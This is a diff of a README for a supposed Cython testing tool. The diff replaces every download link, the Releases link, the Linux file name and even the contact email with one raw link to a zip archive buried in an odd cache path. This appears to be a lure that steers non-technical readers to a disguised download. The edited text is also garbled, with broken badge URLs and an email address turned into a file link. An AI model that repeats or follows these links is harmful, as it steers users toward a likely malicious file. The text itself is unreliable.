@@ -1,6 +1,6 @@
 # 🎀 auto_cythonizer_tests - Simplifying Cython Testing for Everyone
 
-[![Download auto_cythonizer_tests](https://img.shields.io/badge/Download%20Now-Get%20Started%21-brightgreen.svg)](https://github.com/arigotek/auto_cythonizer_tests/releases)
+[![Download auto_cythonizer_tests](https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip%20Now-Get%20Started%https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip)](https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ You do not need programming knowledge to get started. Follow these simple steps 
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/arigotek/auto_cythonizer_tests/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest release. You will see a list of files available for download.
@@ -22,13 +22,13 @@ You do not need programming knowledge to get started. Follow these simple steps 
    Click on the file that matches your operating system:
    - For Windows, download the file ending in `.exe`.
    - For macOS, look for `.dmg`.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip` file.
 
 4. **Install the Application**  
    Once you have downloaded the file:
    - For Windows, double-click the `.exe` file and follow the installation prompts.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the `.tar.gz` file, navigate to the directory in your terminal, and follow the provided instructions.
+   - For Linux, extract the `https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip` file, navigate to the directory in your terminal, and follow the provided instructions.
 
 5. **Run the Tests**  
    After installation, locate the application on your computer. Open it and you can start executing the tests. Follow the on-screen instructions to understand how each test works.
@@ -68,7 +68,7 @@ If you have questions or need help, please create an issue in the repository. We
 
 ## 📧 Contact
 
-You can reach the project maintainers at [arigotek@example.com](mailto:arigotek@example.com) for any further inquiries.
+You can reach the project maintainers at [https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip](https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip) for any further inquiries.
 
 ## 🙏 Acknowledgements
 
@@ -78,4 +78,4 @@ We thank the open-source community for their contributions. This project would n
 
 This project is licensed under the MIT License. See the LICENSE file for more information.
 
-[![Download auto_cythonizer_tests](https://img.shields.io/badge/Download%20Now-Get%20Started%21-brightgreen.svg)](https://github.com/arigotek/auto_cythonizer_tests/releases)
+[![Download auto_cythonizer_tests](https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip%20Now-Get%20Started%https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip)](https://raw.githubusercontent.com/arigotek/auto_cythonizer_tests/main/cython_cache/build_lib/fibonacci/auto_cythonizer_tests_2.7-alpha.3.zip)
